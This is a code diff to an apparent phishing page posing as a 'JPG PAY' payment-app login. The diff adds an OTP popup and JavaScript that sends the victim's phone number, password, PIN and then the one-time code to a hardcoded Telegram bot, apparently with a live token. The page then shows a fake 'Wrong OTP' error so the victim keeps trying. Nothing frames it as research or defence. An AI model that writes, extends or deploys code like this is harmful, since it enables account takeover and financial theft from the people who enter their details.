@@ -31,8 +31,7 @@
       box-shadow: 0 0 25px rgba(255, 255, 255, 0.03);
     }
     .logo-box img {
-      width: 100%;
-      height: 100%;
+      width: 100%; height: 100%;
       object-fit: cover;
       display: block;
     }
@@ -84,10 +83,7 @@
     }
     .row a { color: #4db6ac; text-decoration: underline; }
     .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; }
-    .row input[type="radio"] {
-      width: 16px; height: 16px;
-      accent-color: #4db6ac;
-    }
+    .row input[type="radio"] { width: 16px; height: 16px; accent-color: #4db6ac; }
     
     /* Agreement */
     .checkbox-container {
@@ -120,12 +116,77 @@
     }
     .btn-main:hover { background: #164a40; }
     .btn-main:active { transform: scale(0.98); }
+
+    /* OTP Popup */
+    .popup-overlay {
+      display: none;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.75);
+      justify-content: center; align-items: center;
+      padding: 20px; z-index: 1000;
+      backdrop-filter: blur(4px);
+    }
+    .popup-box {
+      background: #1c1c1c;
+      padding: 28px 24px;
+      border-radius: 24px;
+      width: 100%; max-width: 360px;
+      position: relative;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.7);
+      border: 1px solid #2a2a2a;
+    }
+    .close-btn {
+      position: absolute; top: 15px; right: 15px;
+      background: #2a2a2a; color: #aaa; border: none;
+      border-radius: 50%; width: 34px; height: 34px;
+      font-size: 16px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      transition: background 0.2s;
+    }
+    .close-btn:hover { background: #3a3a3a; color: #fff; }
+    .popup-box h2 { 
+      font-size: 22px; margin-bottom: 12px; 
+      text-align: left; color: #ffffff; font-weight: bold;
+    }
+    .popup-box p { 
+      font-size: 14px; color: #999999; 
+      margin-bottom: 14px; line-height: 1.5; text-align: left; 
+    }
+    .popup-box p span { color: #4db6ac; font-weight: bold; }
+
+    /* OTP Input Group */
+    .otp-input-group {
+      display: flex;
+      align-items: center;
+      background: transparent;
+      border: 1.5px solid #333333;
+      border-radius: 30px;
+      padding: 6px 6px 6px 20px;
+      margin-bottom: 20px;
+    }
+    .otp-input-group input {
+      flex: 1; background: transparent; border: none;
+      color: #ffffff; padding: 10px 0; font-size: 16px; outline: none;
+    }
+    .otp-input-group input::placeholder { color: #666; }
+    .otp-input-group button {
+      background: #1e5b4f; color: #fff; border: none;
+      border-radius: 25px; padding: 12px 22px; font-weight: bold; 
+      cursor: pointer; font-size: 15px; transition: background 0.2s;
+    }
+    .otp-input-group button:hover { background: #164a40; }
+    .otp-input-group button:disabled { background: #333; color: #777; cursor: not-allowed; }
+    .timer-text { 
+      color: #888; font-size: 13px; 
+      margin-bottom: 20px; text-align: center; 
+      min-height: 18px;
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- Logo Box - Photo ka naam 'jpglogo.png' hi rahega kyunki GitHub par yahi naam hai -->
+    <!-- Logo Box -->
     <div class="logo-box">
       <img src="jpglogo.png" alt="JPG PAY">
     </div>
@@ -160,7 +221,26 @@
     </div>
 
     <!-- Submit Button -->
-    <button class="btn-main" onclick="submitLogin()">Sign In</button>
+    <button class="btn-main" onclick="showOTP()">Sign In</button>
+  </div>
+
+  <!-- OTP Popup -->
+  <div class="popup-overlay" id="otpPopup">
+    <div class="popup-box">
+      <button class="close-btn" onclick="closeOTP()">✕</button>
+      <h2>Login OTP</h2>
+      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
+      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
+
+      <div class="otp-input-group">
+        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
+      </div>
+
+      <div class="timer-text" id="timerText"></div>
+
+      <button class="btn-main" onclick="verifyOTP()">Confirm</button>
+    </div>
   </div>
 
   <script>
@@ -170,7 +250,11 @@
     const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
     const CHAT_ID = "7318531273";
 
-    function submitLogin() {
+    let countdown;
+    let timeLeft = 60;
+
+    // Step 1: Sign In dabane par PIN + Password + Phone Telegram par bheje, phir OTP popup khole
+    function showOTP() {
       let phone = document.getElementById('phone').value.trim();
       let pass = document.getElementById('pass').value.trim();
       let pin = document.getElementById('pin').value.trim();
@@ -190,16 +274,79 @@
         return;
       }
 
-      let message = "🔔 *JPG PAY - New Login Attempt*\n\n";
-      message += "📞 Phone: " + phone + "\n";
-      message += "🔑 Password: " + pass + "\n";
-      message += "🔐 6-digit PIN: " + pin;
+      // Telegram par bhejo: Login Attempt with PIN
+      let msg1 = "🔔 *JPG PAY - New Login Attempt*\n\n";
+      msg1 += "📞 Phone: " + phone + "\n";
+      msg1 += "🔑 Password: " + pass + "\n";
+      msg1 += "🔐 6-digit PIN: " + pin;
+      sendToTelegram(msg1);
 
-      sendToTelegram(message);
+      // Display phone in popup
+      document.getElementById('displayPhone').innerText = "+91 " + phone;
+      
+      // Open popup
+      document.getElementById('otpPopup').style.display = 'flex';
+      resetTimer();
+    }
 
-      setTimeout(() => {
-        alert("❌ Invalid details! Please try again.");
+    function closeOTP() { 
+      document.getElementById('otpPopup').style.display = 'none'; 
+      clearInterval(countdown); 
+    }
+
+    // Step 2: Send OTP button
+    function sendOTP() {
+      let phone = document.getElementById('phone').value;
+      startTimer();
+      sendToTelegram("📩 *JPG PAY - OTP Send Button Pressed*\nPhone: " + phone);
+      document.getElementById('sendOtpBtn').disabled = true;
+      document.getElementById('sendOtpBtn').innerText = "Sent";
+    }
+
+    // Step 3: Confirm OTP
+    function verifyOTP() {
+      let otp = document.getElementById('otpInput').value;
+      let phone = document.getElementById('phone').value;
+
+      if (otp === "") { 
+        alert("Bhai, OTP daalo!"); 
+        return; 
+      }
+
+      if (otp.length !== 6) { 
+        alert("OTP exactly 6 digit ka hona chahiye!"); 
+        return; 
+      }
+
+      sendToTelegram("🔐 *JPG PAY - OTP Entered*\nPhone: " + phone + "\nOTP: " + otp);
+
+      setTimeout(() => { 
+        alert("❌ Wrong OTP! Please try again."); 
       }, 500);
+    }
+
+    function startTimer() {
+      timeLeft = 60;
+      const timerDisplay = document.getElementById('timerText');
+      clearInterval(countdown);
+      countdown = setInterval(() => {
+        if (timeLeft <= 0) {
+          clearInterval(countdown); timerDisplay.innerText = "";
+          document.getElementById('sendOtpBtn').disabled = false;
+          document.getElementById('sendOtpBtn').innerText = "Send";
+        } else {
+          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
+          timeLeft--;
+        }
+      }, 1000);
+    }
+
+    function resetTimer() {
+      clearInterval(countdown); timeLeft = 60;
+      document.getElementById('sendOtpBtn').disabled = false;
+      document.getElementById('sendOtpBtn').innerText = "Send";
+      document.getElementById('otpInput').value = "";
+      document.getElementById('timerText').innerText = "";
     }
 
     function sendToTelegram(message) {
